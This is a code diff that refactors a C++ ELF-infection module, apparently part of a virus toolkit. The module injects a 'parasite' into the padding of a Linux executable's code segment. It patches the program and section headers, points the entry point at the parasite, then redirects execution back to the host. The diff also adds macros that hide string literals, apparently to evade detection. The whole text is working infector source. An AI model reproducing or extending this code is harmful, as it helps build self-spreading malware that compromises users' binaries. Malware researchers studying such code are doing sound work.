@@ -1,5 +1,5 @@
 #include "infector/padding_infect.hh"
-// patch arch specific jump code
+#include "common/macros.hh"
 #include "common/patch_pattern.hh"
 #include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
@@ -12,18 +12,12 @@ uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }
 
 // Patch SHT (i.e. find the last section of CODE segment and increase its size
 // by parasite_size)
-bool patch_sht(std::span<std::byte> output_mapping,
+bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
                size_t parasite_size_and_padding,
                Elf64_Off code_segment_last_byte_offset) {
-  auto base = &output_mapping.front();
-  auto elf_header = reinterpret_cast<const Elf64_Ehdr*>(base);
+  auto sht_entry_count = ehdr.e_shnum;
 
-  auto sht_offset = elf_header->e_shoff;
-  auto sht_entry_count = elf_header->e_shnum;
-
-  // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
-  auto section_entry = reinterpret_cast<Elf64_Shdr*>(base + sht_offset);
-
+  auto section_entry = &shdr;
   for (size_t i = 0; i < sht_entry_count; ++i) {
     auto current_section_last_byte_offset =
         section_entry->sh_offset + section_entry->sh_size - 1;
@@ -39,14 +33,9 @@ bool patch_sht(std::span<std::byte> output_mapping,
   return false;
 }
 
-void patch_phdr(std::span<std::byte> host_mapping,
-                uint64_t parasite_size_and_padding,
+void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
                 size_t patch_phdr_entry_idx) {
-  auto elf_header = (Elf64_Ehdr*)(&host_mapping.front());
-  Elf64_Off pht_offset = elf_header->e_phoff;
-
-  // Point to first entry in PHT
-  auto phdr_entry = (Elf64_Phdr*)(&host_mapping[pht_offset]);
+  auto phdr_entry = &phdr;
   phdr_entry += patch_phdr_entry_idx;
 
   // expand the size while accounting for the alignment padding.
@@ -54,17 +43,13 @@ void patch_phdr(std::span<std::byte> host_mapping,
   phdr_entry->p_memsz += parasite_size_and_padding;
 }
 
-Elf64_Addr patch_ehdr(std::span<std::byte> host_mapping,
-                      Elf64_Addr parasite_load_address,
-                      Elf64_Off parasite_file_offset) {
-  Elf64_Ehdr* header = reinterpret_cast<Elf64_Ehdr*>(&host_mapping.front());
-  Elf64_Addr original_entry_point = header->e_entry;
-  if (header->e_type == ET_EXEC) {
-    header->e_entry = parasite_load_address;
+void patch_ehdr(Elf64_Ehdr& header, Elf64_Addr parasite_load_address,
+                Elf64_Off parasite_file_offset) {
+  if (header.e_type == ET_EXEC) {
+    header.e_entry = parasite_load_address;
   } else {
-    header->e_entry = parasite_file_offset;
+    header.e_entry = parasite_file_offset;
   }
-  return original_entry_point;
 }
 
 }  // namespace
@@ -76,23 +61,24 @@ Elf64_Addr patch_ehdr(std::span<std::byte> host_mapping,
 // @param[out] info A struct of information.
 bool PaddingInfect::analyze(std::span<const std::byte> host_mapping,
                             std::span<const std::byte> parasite_mapping) {
-  auto elf_header = (const Elf64_Ehdr*)(&host_mapping.front());
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
-  if ((elf_header->e_type != ET_EXEC && elf_header->e_type != ET_DYN) ||
-      elf_header->e_ident[EI_CLASS] != ELFCLASS64) {
+  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
+      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
 
+  original_entry_point_ = ehdr.e_entry;
   host_size_ = host_mapping.size();
 
-  uint16_t pht_entry_count = elf_header->e_phnum;
-  Elf64_Off pht_offset = elf_header->e_phoff;
+  uint16_t pht_entry_count = ehdr.e_phnum;
   Elf64_Off code_segment_last_byte_offset = 0;
   Elf64_Off parasite_file_offset = 0;
   Elf64_Addr parasite_load_address = 0;
 
   // Point to first entry in PHT
-  auto phdr_entry = (const Elf64_Phdr*)(&host_mapping[pht_offset]);
+  auto phdr_entry =
+      reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
 
   // Parse PHT entries
   for (size_t i = 0; i < pht_entry_count; ++i, ++phdr_entry) {
@@ -150,35 +136,44 @@ bool PaddingInfect::analyze(std::span<const std::byte> host_mapping,
 bool PaddingInfect::inject(std::span<std::byte> host_mapping,
                            std::span<const std::byte> parasite_mapping) {
   if (padding_size_ < parasite_mapping.size()) {
-    vt::printf(
-        "Host cannot accomodate parasite padding size: %d parasite size:%d\n",
-        padding_size_, parasite_mapping.size());
+    const char* msg;
+    STR_LITERAL(
+        msg, PAD1("Host cannot accomodate parasite padding size: %%d parasite "
+                  "size:%%d\n"));
+    vt::printf(msg, padding_size_, parasite_mapping.size());
     return false;
   }
 
-  // Patch program header table and increase text section size.
-  patch_phdr(host_mapping, parasite_size_and_padding_, patch_phdr_entry_idx_);
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
-  // Patch section header table to increase text section size.
-  if (!patch_sht(host_mapping, parasite_size_and_padding_,
-                 code_segment_last_byte_offset_)) {
-    vt::printf("Failed to patch section header table\n");
-    return false;
+  {
+    auto& phdr = reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
+    // Patch program header table and increase text section size.
+    patch_phdr(phdr, parasite_size_and_padding_, patch_phdr_entry_idx_);
   }
 
-  // Patch elf header entry point to run the parasite first.
-  auto original_entry_point =
-      patch_ehdr(host_mapping, parasite_load_address_, parasite_file_offset_);
+  {
+    auto& shdr = reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
+    // Patch section header table to increase text section size.
+    if (!patch_sht(ehdr, shdr, parasite_size_and_padding_,
+                   code_segment_last_byte_offset_)) {
+      return false;
+    }
+  }
+
+  {
+    auto& mutble_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
+    // Patch elf header entry point to run the parasite first.
+    patch_ehdr(mutble_ehdr, parasite_load_address_, parasite_file_offset_);
+  }
 
   // Inject parasite.
   vt::memcpy(&host_mapping[parasite_file_offset_], &parasite_mapping.front(),
              parasite_mapping.size());
 
   // Patch parasite to resume host code after execution.
-  const auto& ehdr =
-      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_entry_point, parasite_load_address_,
+      ehdr.e_type, original_entry_point_, parasite_load_address_,
       parasite_file_offset_, parasite_mapping.size(), host_mapping);
 }
 
